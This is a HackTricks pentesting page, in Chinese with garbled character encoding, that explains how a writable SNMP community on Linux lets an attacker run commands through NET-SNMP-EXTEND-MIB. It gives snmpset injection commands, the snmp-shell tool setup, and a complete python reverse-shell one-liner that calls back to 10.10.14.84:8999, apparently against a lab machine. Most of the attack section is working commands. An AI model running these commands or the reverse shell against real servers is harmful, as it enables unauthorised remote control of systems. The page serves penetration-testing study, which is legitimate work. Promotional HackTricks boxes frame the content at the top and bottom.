<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´è‡³æˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>


æœ¬æ–‡æ‘˜è‡ª[https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)

SNMPæœ‰æ—¶ä¼šè¢«è®¾å¤‡æˆ–æœåŠ¡å™¨çš„ç®¡ç†å‘˜å¿½è§†ï¼Œå®ƒè¢«ä¿ç•™åœ¨é»˜è®¤é…ç½®ä¸­ã€‚åœ¨Linuxæ“ä½œç³»ç»Ÿä¸Šå…·æœ‰å†™æƒé™ï¼ˆ**rwcommunity**ï¼‰çš„SNMPç¤¾åŒºå¯ä»¥è¢«æ»¥ç”¨ï¼Œå…è®¸æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-6.png?w=508)

# **æ‰©å±•æœåŠ¡**

è™½ç„¶æ‚¨æ— æ³•ä¿®æ”¹åœ¨**snmpd.conf**ä¸­é…ç½®çš„ç°æœ‰æ¡ç›®ï¼Œä½†å¯ä»¥é€šè¿‡SNMPæ·»åŠ é¢å¤–çš„å‘½ä»¤ï¼Œå› ä¸ºMIBå®šä¹‰ä¸­çš„â€œMAX-ACCESSâ€æƒé™è®¾ç½®ä¸ºâ€œ**read-create**â€

æ·»åŠ æ–°å‘½ä»¤åŸºæœ¬ä¸Šæ˜¯é€šè¿‡å‘â€œ**nsExtendObjects**â€è¡¨è¿½åŠ é¢å¤–çš„è¡Œæ¥å®ç°çš„ã€‚
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```
åœ¨SNMPæœåŠ¡ä¸­æ³¨å…¥å‘½ä»¤ä»¥è¿è¡Œã€‚**NET-SNMP-EXTEND-MIB** è¦æ±‚æ‚¨å§‹ç»ˆæä¾›å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚è¢«è°ƒç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶/è„šæœ¬ä¹Ÿå¿…é¡»å­˜åœ¨ä¸”å¯æ‰§è¡Œã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-15.png?w=916)

ä½¿ç”¨snmpwalkæšä¸¾æˆ‘ä»¬æ³¨å…¥åˆ°SNMPä¸­çš„å‘½ä»¤æ¥æ‰§è¡Œè¯¥å‘½ä»¤
```bash
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```
æ˜¾ç¤ºå‘½ä»¤æ˜¯ `/bin/echo`ã€‚

![](https://rioasmara.files.wordpress.com/2021/02/image-11.png?w=569)

å½“å®ƒè¢«è¯»å–æ—¶ï¼Œå‘½ä»¤å°†è¢«æ‰§è¡Œã€‚**run-on-read\(\)**

![](https://rioasmara.files.wordpress.com/2021/02/image-12.png?w=612)

å‘½ä»¤ **/bin/echo "hello rio is here"** åœ¨æˆ‘ä»¬çš„ snmpwalk è¯»å–æœŸé—´è¢«æ‰§è¡Œäº†

![](https://rioasmara.files.wordpress.com/2021/02/image-13.png?w=653)

# **ä» Net-SNMP Extend è·å– Shell**

åœ¨è¿™ä¸€èŠ‚ä¸­ï¼Œæˆ‘æƒ³è®¨è®ºå¦‚ä½•è·å¾—æœåŠ¡å™¨ shell æ¥æ§åˆ¶æœåŠ¡å™¨ã€‚

ä½ å¯ä»¥ä½¿ç”¨ç”± **mxrch** å¼€å‘çš„ python è„šæœ¬ï¼Œå¯ä»¥ä» [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git) ä¸‹è½½ã€‚

ä½ å¯ä»¥å®‰è£…è¿è¡Œæ­¤è„šæœ¬çš„å‰ææ¡ä»¶ï¼š
```bash
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```
![](https://rioasmara.files.wordpress.com/2021/02/image-18.png?w=723)

**åˆ›å»ºåå‘ shell**

æ‚¨ä¹Ÿå¯ä»¥é€šè¿‡å°†ä¸‹é¢çš„å‘½ä»¤æ³¨å…¥åˆ° SNMP ä¸­æ¥æ‰‹åŠ¨åˆ›å»ºåå‘ shell
```bash
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```
è¿è¡Œsnmpwalkè§¦å‘å‘½ä»¤æ‰§è¡Œ

æˆ‘ä»¬çš„netcatä»å—å®³è€…é‚£é‡Œæ¥æ”¶reverseshellè¿æ¥ï¼Œè¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶å—å®³è€…æœºå™¨

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricks**ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
